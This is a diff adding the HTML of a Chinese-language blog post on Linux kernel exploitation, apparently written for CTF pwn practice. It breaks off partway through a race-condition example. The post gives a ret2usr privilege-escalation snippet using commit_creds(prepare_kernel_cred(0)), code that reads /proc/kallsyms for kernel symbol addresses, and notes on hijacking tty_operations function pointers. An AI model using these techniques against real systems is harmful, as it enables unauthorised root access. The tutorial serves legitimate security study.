@@ -1,0 +1,528 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="ret2usr核心：利用 commit_creds(prepare_kernel_cred(0)) 进行提取 原理：该方式会自动生成一个合法的 cred，并定位当前线程的 task_struct 的位置，然后修改它的 cred 为新的 cred 当已知 commit_creds 和 prepare_kernel_cred 的函数地址时，用如下代码进行提权： 123456void get_root(">
+<meta property="og:type" content="article">
+<meta property="og:title" content="kernel attack（持续更新）">
+<meta property="og:url" content="http://example.com/2022/05/21/kernel%20attack/index.html">
+<meta property="og:site_name" content="Pwn进你的心">
+<meta property="og:description" content="ret2usr核心：利用 commit_creds(prepare_kernel_cred(0)) 进行提取 原理：该方式会自动生成一个合法的 cred，并定位当前线程的 task_struct 的位置，然后修改它的 cred 为新的 cred 当已知 commit_creds 和 prepare_kernel_cred 的函数地址时，用如下代码进行提权： 123456void get_root(">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-05-20T17:37:34.000Z">
+<meta property="article:modified_time" content="2022-05-27T07:12:06.476Z">
+<meta property="article:author" content="yhellow">
+<meta property="article:tag" content="kernel">
+<meta property="article:tag" content="ret2usr">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2022/05/21/kernel%20attack/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>kernel attack（持续更新） | Pwn进你的心</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Pwn进你的心</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/21/kernel%20attack/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yhellow">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pwn进你的心">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          kernel attack（持续更新）
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-05-21 01:37:34" itemprop="dateCreated datePublished" datetime="2022-05-21T01:37:34+08:00">2022-05-21</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-05-27 15:12:06" itemprop="dateModified" datetime="2022-05-27T15:12:06+08:00">2022-05-27</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Technology/" itemprop="url" rel="index"><span itemprop="name">Technology</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>7.8k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>7 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="ret2usr"><a href="#ret2usr" class="headerlink" title="ret2usr"></a>ret2usr</h2><p>核心：利用 commit_creds(prepare_kernel_cred(0)) 进行提取</p>
+<p>原理：该方式会自动生成一个合法的 cred，并定位当前线程的 task_struct 的位置，然后修改它的 cred 为新的 cred</p>
+<p>当已知 commit_creds 和 prepare_kernel_cred 的函数地址时，用如下代码进行提权：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* (*pkc)(<span class="keyword">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="keyword">void</span> (*cc)(<span class="keyword">char</span>*) = commit_creds;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>注意：“prepare_kernel_cred”和“commit_creds”都是地址，需要用函数指针执行</li>
+</ul>
+<p>对于这两个函数的地址，可以在 “/proc/kallsyms-内核符号表” 中找到，提供以下脚本：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">find_symbols</span><span class="params">()</span> <span class="comment">/* 收集必要信息 */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE* kallsyms_fd = fopen(<span class="string">&quot;/proc/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf, <span class="number">0x30</span>, kallsyms_fd))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred) </span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)</span><br><span class="line">        &#123;	</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;commit_creds);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(prepare_kernel_cred &amp; commit_creds))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>注意：如果在 init 文件中看到如下代码，就不能通过 /proc/kallsyms 查看函数地址了</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict # 设置kptr_restrict为&#x27;1&#x27;</span><br></pre></td></tr></table></figure>
+<h2 id="tty-struct-attack"><a href="#tty-struct-attack" class="headerlink" title="tty_struct attack"></a>tty_struct attack</h2><p>在 <code>open(&quot;/dev/ptmx&quot;, O_RDWR)</code> 时会分配这样一个结构体：tty_struct </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> magic;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="comment">/* Protects ldisc changes: Lock tty not pty */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span></span><br><span class="line">    <span class="keyword">spinlock_t</span> ctrl_lock;</span><br><span class="line">    <span class="keyword">spinlock_t</span> flow_lock;</span><br><span class="line">    <span class="comment">/* Termios values are protected by the termios rwsem */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">termiox</span> *<span class="title">termiox</span>;</span>    <span class="comment">/* May be NULL for unsupported */</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">64</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span>       <span class="comment">/* Protected by ctrl lock */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line">    <span class="keyword">int</span> count;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span>     <span class="comment">/* winsize_mutex */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stopped:<span class="number">1</span>,    <span class="comment">/* flow_lock */</span></span><br><span class="line">              flow_stopped:<span class="number">1</span>,</span><br><span class="line">              unused:BITS_PER_LONG - <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> hw_stopped;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ctrl_status:<span class="number">8</span>,    <span class="comment">/* ctrl_lock */</span></span><br><span class="line">              packet:<span class="number">1</span>,</span><br><span class="line">              unused_ctrl:BITS_PER_LONG - <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> receive_room;  <span class="comment">/* Bytes free for queue */</span></span><br><span class="line">    <span class="keyword">int</span> flow_change;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span></span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> write_wait;</span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> read_wait;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span></span><br><span class="line">    <span class="keyword">void</span> *disc_data;</span><br><span class="line">    <span class="keyword">void</span> *driver_data;</span><br><span class="line">    <span class="keyword">spinlock_t</span> files_lock;      <span class="comment">/* protects tty_files list */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tty_files</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N_TTY_BUF_SIZE 4096</span></span><br><span class="line">    <span class="keyword">int</span> closing;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *write_buf;</span><br><span class="line">    <span class="keyword">int</span> write_cnt;</span><br><span class="line">    <span class="comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
+<p>另一个很有趣的结构体：<code>tty_operations</code>（<code>tty_struct[4]</code>）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">            <span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="keyword">int</span>  (*install)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*remove)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*open)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*close)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*shutdown)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*cleanup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*write)(struct tty_struct * tty,</span><br><span class="line">              <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> count);</span><br><span class="line">    <span class="keyword">int</span>  (*put_char)(struct tty_struct *tty, <span class="keyword">unsigned</span> <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">void</span> (*flush_chars)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*write_room)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*chars_in_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*ioctl)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">long</span> (*compat_ioctl)(struct tty_struct *tty,</span><br><span class="line">                 <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">void</span> (*set_termios)(struct tty_struct *tty, struct ktermios * old);</span><br><span class="line">    <span class="keyword">void</span> (*throttle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*unthrottle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*stop)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*start)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*hangup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*break_ctl)(struct tty_struct *tty, <span class="keyword">int</span> state);</span><br><span class="line">    <span class="keyword">void</span> (*flush_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*set_ldisc)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*wait_until_sent)(struct tty_struct *tty, <span class="keyword">int</span> timeout);</span><br><span class="line">    <span class="keyword">void</span> (*send_xchar)(struct tty_struct *tty, <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmget)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmset)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">set</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span> clear);</span><br><span class="line">    <span class="keyword">int</span> (*resize)(struct tty_struct *tty, struct winsize *ws);</span><br><span class="line">    <span class="keyword">int</span> (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);</span><br><span class="line">    <span class="keyword">int</span> (*get_icount)(struct tty_struct *tty,</span><br><span class="line">                struct serial_icounter_struct *icount);</span><br><span class="line">    <span class="keyword">void</span> (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="keyword">int</span> (*poll_init)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> *options);</span><br><span class="line">    <span class="keyword">int</span> (*poll_get_char)(struct tty_driver *driver, <span class="keyword">int</span> line);</span><br><span class="line">    <span class="keyword">void</span> (*poll_put_char)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> (*proc_show)(struct seq_file *, <span class="keyword">void</span> *);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>全是函数指针，每一个都可以用来劫持</li>
+<li>劫持过后，就可以通过调用对应的函数来执行我们想要的代码了</li>
+</ul>
+<h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><p>条件竞争就是两个或者多个进程或者线程同时处理一个资源（全局变量，文件）产生非预想的执行效果，从而产生程序执行流的改变，从而达到攻击的目的</p>
+<p>条件竞争需要如下的条件：</p>
+<ul>
+<li>并发，即至少存在两个并发执行流：<ul>
+<li>这里的执行流包括线程，进程，任务等级别的执行流</li>
+</ul>
+</li>
+<li>共享对象，即多个并发流会访问同一对象：<ul>
+<li>常见的共享对象有共享内存，文件系统，信号，一般来说，这些共享对象是用来使得多个程序执行流相互交流</li>
+<li>此外，我们称访问共享对象的代码为临界区，在正常写代码时，这部分应该加锁</li>
+</ul>
+</li>
+<li>改变对象，即至少有一个控制流会改变竞争对象的状态：因为如果程序只是对对象进行读操作，那么并不会产生条件竞争</li>
+</ul>
+<p>案例：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> counter;</span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">IncreaseCounter</span><span class="params">(<span class="keyword">void</span>* args)</span> </span>&#123;</span><br><span class="line">    counter += <span class="number">1</span>;</span><br><span class="line">    sleep(<span class="number">0.1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Thread %d has counter value %d\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)pthread_self(), counter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span 